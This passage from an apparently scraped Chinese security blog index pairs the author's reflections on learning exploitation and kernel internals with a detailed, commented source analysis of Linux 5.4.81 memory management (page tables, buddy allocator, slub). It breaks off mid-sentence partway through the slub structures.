一个宏定义一个宏定义的看, 一个变量一个变量的看, 一遍不行就再看二遍, 三遍 … 夏天了, 终于懂了ptmalloc原理, 不过这只是堆溢出利用的起始, 原本以为接下来会是一番更加艰难的探索, 没成想, 好像突然开窍了, 原本各种各样的堆溢出利用方法在我看来异常优雅, 而更让人开心的是, 有很多利用方式都在我阅读源码期间的脑海中闪现过, 于是学习利用技巧变成了复现自己的一些想法 开心没多久, 即使我不愿意也不得不承认, 我学到的东西正在从我脑海中一点一点忘却, 更可怕的是为了获得这些知识, 我曾花费了半年的时间去探索 决定写文章去记录自己的所得, 这样就不会在以后忘记他们 于是写下了linux漏洞利用思维导图 ","date":"2021-01-27","objectID":"/reprint/:2:0","tags":null,"title":"一些思考","uri":"/reprint/"},{"categories":null,"content":"2019-2020(大二) 开学之后, 非常幸运的加入了0x401_Team, 在这里找到了一群志同道合的朋友, 一起打ctf, 虽然我还是很菜 2019年的下半年在打ctf中度过, 同时增加了ptmalloc源码分析, 堆溢出demo这两篇文章 冬天, 疫情, 2020上半年在家里度过 带着对hello_world内在原理与进程间内存为什么不会互相影响的疑惑, 开始探索内核 搭建环境, 编译busybox, 编译内核, 虽然在现在看来, 不到一个小时就能完成的事情, 硬是被我搞成了一个星期 刚开始的内核学习非常顺利, rop, 任意读写, 堆喷 和用户态利用大同小异, 很快学完之后, 陷入了恐慌, 恐慌的原因在于自己清楚的知道, 自己远远不够, 但学习的道路确实断了, 没有方向, 不知道下一步该迈向哪里, 我尝试阅读源码, 但太过晦涩, 放弃, 最后只挑选了内核启动这块做了简单的分析, 但内核入门远远不够 冷静下来之后准备先换个方向继续学习, 于是选择路由器, 折腾一段时间之后, 懂了一个道理, 路由器似乎难点在于环境搭建, 你总是不能搭建一个合适的环境(能让exp顺便跑通, 即使exp异常简单) 陆续的分析了几个路由器cve之后, 发现大多数是命令注入和栈溢出, 很显然从利用的角度来说, 是比较简单的利用 拆了自家的路由器, 不到一个下午就找到了一个明显的栈溢出, 于是利用弹shell一气呵成, 不过, 并没有想象中的高兴(路由器厂商鱼龙混杂, 安全意识参差不齐, 这并不是一件值得开心的事情) 接触fuzz, 阅读afl源码 夏天到了, 疫情有所缓解, 在朋友的推荐下参与了一些安全企业的ctf出题, 以及地方企业的安全培训工作(不管是出题还是安全培训都在一定意义上让我重新回顾了基础知识, 并有所提高) ","date":"2021-01-27","objectID":"/reprint/:3:0","tags":null,"title":"一些思考","uri":"/reprint/"},{"categories":null,"content":"2020(大三) 2020年秋天, 困扰了我两年的问题还是没有得到解决, 另外对于内核的学习已经陷入僵局 下定决心阅读内核源码, 源码读的每天都很煎熬 大概坚持了一个月把, 和很久以前阅读ptmalloc源码一样, 突然开了窍, 一边做笔记, 一边继续阅读源码, 于是写成了: linux内核(5.4.81)—内存管理模块源码分析, 读完源码之后, 我解决了进程间内存空间为什么不相互影响的疑惑, 但是对于进程运行还是存在疑惑(进程如何切换) 为了解决上诉问题, 继续阅读内核进程管理源码, 对于调度策略并不感兴趣, 所以这次大概花了两天时间, 就掌握了我想知道的东西 至此, 我好像真的解决了那个敦促我转专业进入网安的问题, hello_world的运行原理 开新坑进行 linux内核网络模块源码分析, 预期一个月内完成 开始复现内核cve, 期间发现内核cve的难点在于对于内核源码的理解, 恰好, 我对内核源码有一些理解, 所以cve复现速度可喜 开始复现linux 用户态cve, 因为具有pwn经验, 所以用户态cve复现速度也很可观 开始尝试自定义fuzz工具, 尝试挖掘二进制漏洞, 因为前期阅读过fuzz工具源码, 所以这部分思路比较活跃, 等待结果 开始尝试进行代码审计 ","date":"2021-01-27","objectID":"/reprint/:4:0","tags":null,"title":"一些思考","uri":"/reprint/"},{"categories":["linux内核源码分析"],"content":"已投稿于安全客 页表 1.1. 页表查询–以x86_64下的4级页表举例(硬件) 1.1.1. TLB转换 1.1.2. 页表转换 1.1.3. 页表结构cache转换 1.2. 拓展 1.2.1. 普通页表cache 1.2.2. Huge_Page 1.2.3. 页表标志位 伙伴算法(buddy) alloc_pages源码分析 3.1. alloc_pages_current 3.2. __alloc_pages_nodemask 3.2.1. get_page_from_freelist 3.2.2. _alloc_pages_slowpath _free_pages源码分析 4.1. free_unref_page 4.1.1. free_pcppages_bulk 4.2. __free_pages_ok 4.2.1. __free_one_page slub算法 5.1. 结构体解析 kmem_cache_alloc源码分析 6.1. __slab_alloc 6.1.1. get_freelist kmem_cache_free源码分析 7.1. cache_from_obj 7.2. slab_free_freelist_hook 7.3. do_slab_free 7.3.1. __slab_free 进程vma 8.1. vm_area_struct 结构体 8.2. find_vma(vma查找) 8.2.1. vmacache_find 8.3. insert_vm_struct(vma插入) 8.3.1. find_vma_links 8.3.2. 红黑树规则 缺页中断 9.1. __do_page_fault源码分析 9.2. fault_in_kernel_space 9.3. do_kern_addr_fault 9.3.1. vmalloc_fault 9.3.2. spurious_kernel_fault 9.3.3. bad_area_nosemaphore 9.4. do_user_addr_fault 9.4.1. handle_mm_fault ptmalloc 杂记 linux作为开源内核，被广泛使用。同时随着用户态安全机制的逐渐完善，攻击成本逐年升高，越来越多的黑客将目光投向linux内核，linux内核安全问题也随之被越来越多的安全研究人员关注。但作为一个规模宏大的开源项目，linux内核安全研究存在非常高的研究门槛，不管是针对特定模块的漏洞挖掘，还是cve复现，对内核的理解限制了绝大多数安全研究人员。而本文则希望通过对内核源码做详细分析来让更多的安全研究人员越过内核门槛。 这篇文章的贡献如下： （1）硬件层面上分析linux内核页表 （2）从buddy源码分析linux内核页管理 （3）从slub源码分析linux内核小内存管理 （4）从vma源码分析linux内核对于进程内存空间的布局及管理 （5）分析缺页中断流程 （6）从ptmalloc源码分析用户态内存管理机制，以及如何通过特定api与linux内核交互 ","date":"2021-01-12","objectID":"/kernel_mm/:0:0","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"1. 页表 ","date":"2021-01-12","objectID":"/kernel_mm/:1:0","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"1.1. 页表查询–以x86_64下的4级页表举例(硬件) 流程总览(定义虚拟地址virt_addr, 寻找对应的物理地址phy_addr) 顺序: TLB -\u003e 页表结构cache -\u003e 页表(MMU硬件实现) MMU = TLB(Translation Lookaside Buffer) + table walk unit 1.1.1. TLB转换 明确概念: VPN(virtual page number), PPN(physical page number),VPO(virtual page offset)和PPO(physical page offset) 对于线性地址和物理地址而言, 都是以page为最小的管理单元, 那么也就是说如果线性地址可以映射到某物理地址, 则两者页偏移相同(默认page size = 4K, 占用低12bits), 即VPO = PPO TLB可以简单理解成VPN-\u003ePPN(36bits), 实现了一个线性映射, 基本结构如下: ___________________ |__VPN1___|__PPN1___| |__VPN2___|__PPN2___| |__VPN3___|__PPN3___| ... ... 通过VPN(virt_addr[12:48])定位表项 全相连(full associative)– VPN可以被填充在TLB中的任何位置 定位VPN对应的表项需要遍历TLB中的所有表项 直接匹配– VPN被映射在特定位置 如果TLB存在n个表项, 那么VPN%n即为该VPN的索引 定位到索引后, 查看VPN是否匹配, 如果不匹配则TLB miss 组相连(set-associative)– 全相连和直接匹配相结合 TLB被划分为m组, 每个组存在n表项, VPN分为set(VPN[47-log2(m):48]), tag(VPN[12:48-log2(m)]) VPN[47-log2(m):48]%m为该VPN的set索引 定位到索引后, 查看set内是否存在tag, 如果不存在则TLB miss 1.1.2. 页表转换 明确概念: 对于四级页表: PGD(page global directory), PUD(page upper directory), PMD(page middle directory), PTE(page table entry), 每个页表占9bits, 支持48bits虚拟地址 对于五级页表：添加P4D表项, 支持57位虚拟地址 通过virt_addr[12:48]定位page table entry CR3寄存器存储PGD物理地址, virt_addr[39:48]为PGD_index, PGD+PGD_index=PGD_addr virt_addr[30:39]为PUD_index, PGD_addr+PUD_index=PUD_addr virt_addr[21:30]为PME_index, PUD_addr+PME_index=PME_addr virt_addr[12:21]为PTE_index, PME_addr+PTE_index=PTE_addr PTE_addr即为page table entry是一个表项映射到PPN 1.1.3. 页表结构cache转换 明确概念: 如果某些虚拟地址临近, 那么很有可能他们会有相同的页表项(PGD or PUD or PMD or PTE),对于这种情况如果还是依次查询页表就会浪费大量时间, 所以存在页表结构cache, 用来缓存页表 cache种类: PDE cache(virt_addr[21:48]作为tag, 映射PME entry地址) PDPTE cache(virt_addr[30:48]作为tag, 映射PUD entry地址) PML4 cache(virt_addr[39:48]作为tag, 映射PGD entry地址) ","date":"2021-01-12","objectID":"/kernel_mm/:1:1","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"1.2. 拓展 1.2.1. 普通页表cache 明确概念: 页表保存在内存中, 可以被缓存到普通cache 各级页表中存在PCD(page-level cache disable)标志位, 控制下一级页表是否需要被缓存 1.2.2. Huge_Page 明确概念: 页表中指向下一级的地址是按页对齐的, 也就是低12bits无效, 可以用作flag标志位 page size flag为1时表示当前页表的下级地址对应大页地址而不是页表 x86两级页表支持4MB大页(跳过PTE, 4K*2^10=4MB) x86_64四级页表支持2MB大页(跳过PTE, 4K*2^9=2MB), 1GB大页(跳过PME, 2M*2^9=1GB) 1.2.3. 页表标志位 P(Present) - 为1表明该page存在于当前物理内存中, 为0则触发page fault。 G(Global)- 标记kernel对应的页, 也存在于TLB entry, 表示该页不会被flush掉。 A(Access) - 当page被访问(读/写)过后, 硬件置1。软件可置0, 然后对应的TLB将会被flush掉。 D(Dirty)- 对写回的page有作用。当page被写入后, 硬件置1, 表明该page的内容比外部disk/flash对应部分要新, 当系统内存不足, 要将该page回收的时候, 需首先将其内容flush到外部存储, 之后软件将该标志位清0。 R/W和U/S属于权限控制类： R/W(Read/Write) - 置1表示该page是writable的, 置0是readonly。 U/S(User/Supervisor) - 置0表示只有supervisor(比如操作系统中的kernel)才可访问该page, 置1表示user也可以访问。 PCD和PWT和cache属性相关： PCD(Page Cache Disabled)- 置1表示disable, 即该page中的内容是不可以被cache的。如果置0(enable), 还要看CR0寄存器中的CD位这个总控开关是否也是0。 PWT (Page Write Through)- 置1表示该page对应的cache部分采用write through的方式, 否则采用write back。 64位特有: XD (Execute Disable)- 在bit[63]中 CR3支持PCID: CR4寄存器的PCIDE位 = 1, 则CR3低12位表示PCID(覆盖PCD和PWT–CR3低12bits只有PCD和PWT标志位) ","date":"2021-01-12","objectID":"/kernel_mm/:1:2","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"2. 伙伴算法(buddy) alloc_pages(内存分配)概略图 __free_pages(内存释放)缩略图 ","date":"2021-01-12","objectID":"/kernel_mm/:2:0","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"3. alloc_pages源码分析 pol变量保存内存分配策略(man set_mempolicy) MPOL_DEFAULT: 默认策略, 优先从当前结点分配内存, 若当前结点无空闲内存, 则从最近的有空闲内存的结点分配 MPOL_BIND: 指定内存分配结点集合, 若该集合内无空闲内存, 则分配失败 MPOL_INTERLEAVE: 内存分配要覆盖所有结点, 且每个结点使用的内存大小相同, 常用于共享内存区域 MPOL_PREFERRED: 从指定结点上分配内存, 若该结点无空闲内存, 则从其他结点分配 MPOL_LOCAL: 同MPOL_DEFAULT water_mark enum zone_watermarks { WMARK_MIN, WMARK_LOW, WMARK_HIGH, NR_WMARK }; WMARK_MIN: 当空闲页面的数量降到WMARK_MIN时, 唤醒 kswapd 守护进程以同步的方式进行直接内存回收, 同时只有GFP_ATOMIC可以在这种情况下分配内存 WMARK_LOW: 当空闲页面的数量降到WMARK_LOW时, 唤醒 kswapd 守护进程进行内存回收 WMARK_HIGH: kswapd进程休眠 自旋锁(spin_lock) 为什么使用自旋锁: 使用常规锁会发生上下文切换,时间不可预期,对于一些简单的、极短的临界区来说是一种性能损耗 中断上下文是不允许睡眠的,除了自旋锁以外的其他锁都有可能导致睡眠或者进程切换,这是违背了中断的设计初衷,会发生不可预知的错误 自旋锁的功能: 一直轮询等待检查临界区是否可用, 直至时间片用完 自旋锁使用原则: 禁止抢占: 如果A, B同时访问临界区, A进程首先获得自旋锁, B进程轮询等待, B抢占A后, B无法获得自旋锁, 造成死锁 禁止睡眠: 如果自旋锁锁住以后进入睡眠,而又不能进行处理器抢占,内核的调取器无法调取其他进程获得该CPU,从而导致该CPU被挂起；同时该进程也无法自唤醒且一直持有该自旋锁,进一步会导致其他使用该自旋锁的位置出现死锁 自旋锁的几个实现: spin_lock: 只禁止内核抢占, 不会关闭本地中断 spin_lock_irq: 禁止内核抢占, 且关闭本地中断 spin_lock_irqsave: 禁止内核抢占, 关闭中断, 保存中断状态寄存器的标志位 spin_lock与spin_lock_irq的区别: 禁止中断与禁止抢占的原因相同 spin_lock_irq与spin_lock_irqsave的区别: 假设临界区被两把spin_lock_irq(a-\u003eb)锁定, 当b解锁后(a还在加锁中), 不会保存a加锁后的中断寄存器状态(直接开中断), 也就是锁a在加锁时, 中断被打开, 导致spin_lock_irq在功能上和spin_lock相同, 也就具备了spin_lock的中断隐患 ","date":"2021-01-12","objectID":"/kernel_mm/:3:0","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"3.1. alloc_pages_current struct page *alloc_pages_current(gfp_t gfp, unsigned order) { // pol变量保存内存分配策略(默认为default_policy) struct mempolicy *pol = \u0026default_policy; struct page *page; // 如果不在中断状态下且未指定在当前结点分配内存时, 使用get_task_policy获得当前进程内存分配策略 if (!in_interrupt() \u0026\u0026 !(gfp \u0026 __GFP_THISNODE)) pol = get_task_policy(current); // 如果内存分配策略为MPOL_INTERLEAVE, 则进入alloc_page_interleave if (pol-\u003emode == MPOL_INTERLEAVE) page = alloc_page_interleave(gfp, order, interleave_nodes(pol)); else page = __alloc_pages_nodemask(gfp, order, policy_node(gfp, pol, numa_node_id()), policy_nodemask(gfp, pol)); return page; } ","date":"2021-01-12","objectID":"/kernel_mm/:3:1","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"3.2. __alloc_pages_nodemask struct page * __alloc_pages_nodemask(gfp_t gfp_mask, unsigned int order, int preferred_nid, nodemask_t *nodemask) { struct page *page; unsigned int alloc_flags = ALLOC_WMARK_LOW; gfp_t alloc_mask; /* The gfp_t that was actually used for allocation */ struct alloc_context ac = { }; // 如果order大于MAX_ORDER(11), 则内存分配失败 if (unlikely(order \u003e= MAX_ORDER)) { WARN_ON_ONCE(!(gfp_mask \u0026 __GFP_NOWARN)); return NULL; } // 添加gfp_allowed_mask标志位 gfp_mask \u0026= gfp_allowed_mask; alloc_mask = gfp_mask; // 填充ac参数(用于内存分配), 并做一些检查 if (!prepare_alloc_pages(gfp_mask, order, preferred_nid, nodemask, \u0026ac, \u0026alloc_mask, \u0026alloc_flags)) return NULL; // 决定是否平衡各个zone中的脏页, 确定zone(相当于对prepare_alloc_pages的补充) finalise_ac(gfp_mask, \u0026ac); // 给alloc_flags添加ALLOC_NOFRAGMENT标志位(不使用zone备用迁移类型), 如果遍历完本地zone后仍然无法分配内存则取消该标志位, 该方案是为了减少内存碎片 alloc_flags |= alloc_flags_nofragment(ac.preferred_zoneref-\u003ezone, gfp_mask); // 通过快分配分配内存页 page = get_page_from_freelist(alloc_mask, order, alloc_flags, \u0026ac); if (likely(page)) goto out; alloc_mask = current_gfp_context(gfp_mask); ac.spread_dirty_pages = false; if (unlikely(ac.nodemask != nodemask)) ac.nodemask = nodemask; // 通过慢分配分配内存页 page = __alloc_pages_slowpath(alloc_mask, order, \u0026ac); out: if (memcg_kmem_enabled() \u0026\u0026 (gfp_mask \u0026 __GFP_ACCOUNT) \u0026\u0026 page \u0026\u0026 unlikely(__memcg_kmem_charge(page, gfp_mask, order) != 0)) { __free_pages(page, order); page = NULL; } trace_mm_page_alloc(page, order, alloc_mask, ac.migratetype); return page; } prepare_alloc_pages static inline bool prepare_alloc_pages(gfp_t gfp_mask, unsigned int order, int preferred_nid, nodemask_t *nodemask, struct alloc_context *ac, gfp_t *alloc_mask, unsigned int *alloc_flags) { // ac填充从gfp_mask获取的内存分配参数 // 获得当前nodemask对应的zone的max_index ac-\u003ehigh_zoneidx = gfp_zone(gfp_mask); // 获得node对应的zone_list ac-\u003ezonelist = node_zonelist(preferred_nid, gfp_mask); ac-\u003enodemask = nodemask; // 选择迁移类型 ac-\u003emigratetype = gfpflags_to_migratetype(gfp_mask); // 判断是否存在cpuset机制 if (cpusets_enabled()) { *alloc_mask |= __GFP_HARDWALL; if (!ac-\u003enodemask) ac-\u003enodemask = \u0026cpuset_current_mems_allowed; else *alloc_flags |= ALLOC_CPUSET; } // 函数未实现 fs_reclaim_acquire(gfp_mask); fs_reclaim_release(gfp_mask); // 如果内存紧张可能会休眠 might_sleep_if(gfp_mask \u0026 __GFP_DIRECT_RECLAIM); // 对gfp_mask, ord做检查(默认没有开启CONFIG_FAIL_PAGE_ALLOC的情况下, 直接return false) if (should_fail_alloc_page(gfp_mask, order)) return false; // 匹配CMA机制 if (IS_ENABLED(CONFIG_CMA) \u0026\u0026 ac-\u003emigratetype == MIGRATE_MOVABLE) *alloc_flags |= ALLOC_CMA; return true; } finalise_ac static inline void finalise_ac(gfp_t gfp_mask, struct alloc_context *ac) { /* Dirty zone balancing only done in the fast path */ ac-\u003espread_dirty_pages = (gfp_mask \u0026 __GFP_WRITE); // 从zone_list头部开始寻找匹配nodemask的zoneref ac-\u003epreferred_zoneref = first_zones_zonelist(ac-\u003ezonelist, ac-\u003ehigh_zoneidx, ac-\u003enodemask); } 3.2.1. get_page_from_freelist static struct page * get_page_from_freelist(gfp_t gfp_mask, unsigned int order, int alloc_flags, const struct alloc_context *ac) { struct zoneref *z; struct zone *zone; struct pglist_data *last_pgdat_dirty_limit = NULL; bool no_fallback; retry: /* * Scan zonelist, looking for a zone with enough free. */ // ALLOC_NOFRAGMENT标志位由alloc_flags_nofragment()函数设置 // no_fallback: node-\u003enode_zonelists[]包含本node的zones以及备用zones, 设置fallback后可使用备用zones no_fallback = alloc_flags \u0026 ALLOC_NOFRAGMENT; z = ac-\u003epreferred_zoneref; // 遍历zone for_next_zone_zonelist_nodemask(zone, z, ac-\u003ezonelist, ac-\u003ehigh_zoneidx, ac-\u003enodemask) { struct page *page; unsigned long mark; // 判断cpuset是否开启且当前CPU是否允许在内存域zone所在结点中分配内存 if (cpusets_enabled() \u0026\u0026 (alloc_flags \u0026 ALLOC_CPUSET) \u0026\u0026 !__cpuset_zone_allowed(zone, gfp_mask)) continue; // ac-\u003espread_dirty_pages不为0表示gfp_mask存在__GFP_WRITE标志位, 有可能增加脏页 if (ac-\u003espread_dirty_pages) { if (last_pgdat_dirty_limit == zone-\u003ezone_pgdat) continue; // 如果zone对应的node脏页超标则使用last_pgdat_dirty_limit标识, 并跳过该zone if (!node_dirty_ok(zone-\u003ezone_pgdat)) { last_pgdat_dirty_limit = zone-\u003ezone_pgdat; continue; } } // 如果设置no_fallback且当前zone并非p","date":"2021-01-12","objectID":"/kernel_mm/:3:2","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"4. _free_pages源码分析 void __free_pages(struct page *page, unsigned int order) { // 检查并更新(-1)page-\u003e_refcount, 当page-\u003e_refcount=0时, return true if (put_page_testzero(page)) // 如果order=0 --\u003e free_unref_page // 如果order\u003e0 --\u003e __free_pages_ok free_the_page(page, order); } ","date":"2021-01-12","objectID":"/kernel_mm/:4:0","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"4.1. free_unref_page free_unref_page -\u003e free_unref_page_commit static void free_unref_page_commit(struct page *page, unsigned long pfn) { struct zone *zone = page_zone(page); struct per_cpu_pages *pcp; int migratetype; // 获得迁移类型 migratetype = get_pcppage_migratetype(page); __count_vm_event(PGFREE); // pcp_list 只放置unmovable, reclaimable, movable类型page // 大于等于MIGRATE_PCPTYPES的迁移类型中MIGRATE_ISOLATE不能被放入pcp if (migratetype \u003e= MIGRATE_PCPTYPES) { if (unlikely(is_migrate_isolate(migratetype))) { // 放入伙伴系统 free_one_page(zone, page, pfn, 0, migratetype); return; } migratetype = MIGRATE_MOVABLE; } pcp = \u0026this_cpu_ptr(zone-\u003epageset)-\u003epcp; // 将page放入pcp-\u003elists[migratetype]链表表头 list_add(\u0026page-\u003elru, \u0026pcp-\u003elists[migratetype]); pcp-\u003ecount++; // 如果pcp-\u003ecount(pcp中页数目) \u003e= pcp-\u003ehigh(pcp中最大页数目), 则将多余的page放入伙伴系统 if (pcp-\u003ecount \u003e= pcp-\u003ehigh) { unsigned long batch = READ_ONCE(pcp-\u003ebatch); free_pcppages_bulk(zone, batch, pcp); } } 4.1.1. free_pcppages_bulk static void free_pcppages_bulk(struct zone *zone, int count, struct per_cpu_pages *pcp) { int migratetype = 0; int batch_free = 0; int prefetch_nr = 0; bool isolated_pageblocks; struct page *page, *tmp; LIST_HEAD(head); count = min(pcp-\u003ecount, count); // 通过循环遍历迁移类型列表, 依次递增删除页数(batch_free) while (count) { struct list_head *list; do { batch_free++; // 循环查询pcp-\u003elists[migratetype] if (++migratetype == MIGRATE_PCPTYPES) migratetype = 0; list = \u0026pcp-\u003elists[migratetype]; } while (list_empty(list)); // 只有一个迁移类型非空, 在这里释放全部count if (batch_free == MIGRATE_PCPTYPES) batch_free = count; do { // 从列表尾部获得page page = list_last_entry(list, struct page, lru); list_del(\u0026page-\u003elru); pcp-\u003ecount--; if (bulkfree_pcp_prepare(page)) continue; // 将取出的page全部放入以head为头的链表中 list_add_tail(\u0026page-\u003elru, \u0026head); // 数据预取可以加快速度 if (prefetch_nr++ \u003c pcp-\u003ebatch) prefetch_buddy(page); } while (--count \u0026\u0026 --batch_free \u0026\u0026 !list_empty(list)); } spin_lock(\u0026zone-\u003elock); isolated_pageblocks = has_isolate_pageblock(zone); list_for_each_entry_safe(page, tmp, \u0026head, lru) { // 获得迁移类型 int mt = get_pcppage_migratetype(page); // 迁移类型不能是isolated VM_BUG_ON_PAGE(is_migrate_isolate(mt), page); if (unlikely(isolated_pageblocks)) mt = get_pageblock_migratetype(page); // 释放page进入伙伴算法 __free_one_page(page, page_to_pfn(page), zone, 0, mt); trace_mm_page_pcpu_drain(page, 0, mt); } spin_unlock(\u0026zone-\u003elock); } ","date":"2021-01-12","objectID":"/kernel_mm/:4:1","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"4.2. __free_pages_ok __free_pages_ok -\u003e free_one_page static void free_one_page(struct zone *zone, struct page *page, unsigned long pfn, unsigned int order, int migratetype) { spin_lock(\u0026zone-\u003elock); // 判断zone是否存在isolate迁移类型, page是否是isolate迁移类型(一般没有这个配置) if (unlikely(has_isolate_pageblock(zone) || is_migrate_isolate(migratetype))) { migratetype = get_pfnblock_migratetype(page, pfn); } __free_one_page(page, pfn, zone, order, migratetype); spin_unlock(\u0026zone-\u003elock); } 4.2.1. __free_one_page static inline void __free_one_page(struct page *page, unsigned long pfn, struct zone *zone, unsigned int order, int migratetype) { unsigned long combined_pfn; unsigned long uninitialized_var(buddy_pfn); struct page *buddy; unsigned int max_order; struct capture_control *capc = task_capc(zone); max_order = min_t(unsigned int, MAX_ORDER, pageblock_order + 1); VM_BUG_ON(!zone_is_initialized(zone)); VM_BUG_ON_PAGE(page-\u003eflags \u0026 PAGE_FLAGS_CHECK_AT_PREP, page); VM_BUG_ON(migratetype == -1); if (likely(!is_migrate_isolate(migratetype))) // 更新zone状态 __mod_zone_freepage_state(zone, 1 \u003c\u003c order, migratetype); VM_BUG_ON_PAGE(pfn \u0026 ((1 \u003c\u003c order) - 1), page); VM_BUG_ON_PAGE(bad_range(zone, page), page); continue_merging: // 循环遍历直到order = max_order - 1 while (order \u003c max_order - 1) { if (compaction_capture(capc, page, order, migratetype)) { __mod_zone_freepage_state(zone, -(1 \u003c\u003c order), migratetype); return; } // buddy_pfn = page_pfn ^ (1 \u003c\u003c order); // 定位兄弟页 buddy_pfn = __find_buddy_pfn(pfn, order); // 获得兄弟页的struct page buddy = page + (buddy_pfn - pfn); // 判断buddy_pfn是否有效 if (!pfn_valid_within(buddy_pfn)) goto done_merging; // 1. buddy_ord == order // 2. buddy_zone == zone // 3. buddy-\u003e_refcount == 0 // 若满足以上条件则buddy可合并 if (!page_is_buddy(page, buddy, order)) goto done_merging; // it is CONFIG_DEBUG_PAGEALLOC guard page if (page_is_guard(buddy)) clear_page_guard(zone, buddy, order, migratetype); else // 将buddy从对应free_area[order]中删除 del_page_from_free_area(buddy, \u0026zone-\u003efree_area[order]); // 设置合并页的struct page以及pfn combined_pfn = buddy_pfn \u0026 pfn; page = page + (combined_pfn - pfn); pfn = combined_pfn; order++; } if (max_order \u003c MAX_ORDER) { /* If we are here, it means order is \u003e= pageblock_order. * We want to prevent merge between freepages on isolate * pageblock and normal pageblock. Without this, pageblock * isolation could cause incorrect freepage or CMA accounting. * * We don't want to hit this code for the more frequent * low-order merging. */ if (unlikely(has_isolate_pageblock(zone))) { int buddy_mt; buddy_pfn = __find_buddy_pfn(pfn, order); buddy = page + (buddy_pfn - pfn); buddy_mt = get_pageblock_migratetype(buddy); if (migratetype != buddy_mt \u0026\u0026 (is_migrate_isolate(migratetype) || is_migrate_isolate(buddy_mt))) goto done_merging; } max_order++; goto continue_merging; } done_merging: // 设置page的阶数, 将page标记为伙伴系统页 set_page_order(page, order); // 如果page并不是最大的page, 检查伙伴页是否是free状态的, 如果是, 但是上述步骤合并失败则有可能伙伴页正在被释放, 这时候应该把page放在zone-\u003efree_area[order]尾部(延缓page被分配出去), 这样等伙伴页释放完成后就可以一起被合并成更大的page了 if ((order \u003c MAX_ORDER-2) \u0026\u0026 pfn_valid_within(buddy_pfn) \u0026\u0026 !is_shuffle_order(order)) { struct page *higher_page, *higher_buddy; combined_pfn = buddy_pfn \u0026 pfn; higher_page = page + (combined_pfn - pfn); buddy_pfn = __find_buddy_pfn(combined_pfn, order + 1); higher_buddy = higher_page + (buddy_pfn - combined_pfn); if (pfn_valid_within(buddy_pfn) \u0026\u0026 page_is_buddy(higher_page, higher_buddy, order + 1)) { // 把page置入zone-\u003efree_area[order]链表尾部 add_to_free_area_tail(page, \u0026zone-\u003efree_area[order], migratetype); return; } } if (is_shuffle_order(order)) // 获得随机数, 随机决定放在头还是尾??? add_to_free_area_random(page, \u0026zone-\u003efree_area[order], migratetype); else // 把page置入zone-\u003efree_area[order]链表头部 add_to_free_area(page, \u0026zone-\u003efree_area[order], migratetype); } ","date":"2021-01-12","objectID":"/kernel_mm/:4:2","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"5. slub算法 slab_debug 下的object: kmem_cache缓冲区建立后, 所有内存空间用POISON_INUSE(0X5a)填充 object被释放后用POISON_FREE(0X6b)填充 read_left_pad, red_zone用特殊字节填充, 用作magic_num kmem_cache_alloc概略图 kmem_cache_free概略图 ","date":"2021-01-12","objectID":"/kernel_mm/:5:0","tags":["linux kernel","源码分析","内存管理"],"title":"linux内核(5.4.81)---内存管理模块源码分析","uri":"/kernel_mm/"},{"categories":["linux内核源码分析"],"content":"5.1. 结构体解析 kmem_cache结构体 struct kmem_cache { struct kmem_cache_cpu __percpu *cpu_slab; // per cpu变量, cpu本地内存缓存池, 存储slab slab_flags_t flags; // object分配掩码 unsigned long min_partial; // kmem_cache_node中的partial链表slab的数量上限, 超过限度多余的slab会被释放 unsigned int size; // 被分配的object真实大小 unsigned int object_size; // 用户申请的obj_size unsigned int offset; // slub将要被分配出去的obj中存储下一个空闲obj指针(next_obj), 而存储这个空闲obj指针的地址就用obj-\u003eoffset来表示 #ifdef CONFIG_SLUB_CPU_PARTIAL unsigned int cpu_partial; // 如果cpu_slab中存在partial链表, 那么该值将作为partial链表数量上限, 超过上限后全部slab将被转移到kmem_cache_node中的partial链表 #endif struct kmem_cache_order_objects oo; // 低16位代表一个slab中所有object的数量(oo \u0026 ((1 \u003c\u003c 16) - 1)), 高16位代表一个slab管理的page数量((2^(oo 16)) pages) struct kmem_cache_order_objects max; // max=oo, 表示最大分配量 struct kmem_cache_order_objects min; // min功能与oo, max相同, 表示最小分配量 gfp_t allocflags; // 从伙伴系统继承的内存掩码 int refcount; // 重用计数器, 当用户请求创建的slub分配器大小与已经创建的slub分配器相似时, 计数+1, 进行slub重用 unsigned int inuse; // 元数据偏移量 unsigned int align; // 字节对齐大小 const char *name; // sysfs文件系统显示使用 struct list_head list; // 挂载所有的slab ... struct kmem_cache_node *node[MAX_NUMNODES]; // slab节点 }; kmem_cache_cpu结构体 struct kmem_cache_cpu { void **freelist; // 指向下一个可用空闲obj unsigned long tid; // 相当于cpu的标识, 用于辨别cpu是否被抢占, 用于同步 struct page *page; // 当前正在被分配的slab #ifdef CONFIG_SLUB_CPU_PARTIAL struct page *partial; // 指向曾分配完所有的obj，但当前已回收至少一个对象的slab #endif }; kmem_cache_node结构体 struct kmem_cache_node { spinlock_t list_lock; // 保护node资源的自旋锁 #ifdef CONFIG_SLUB unsigned long nr_partial; // 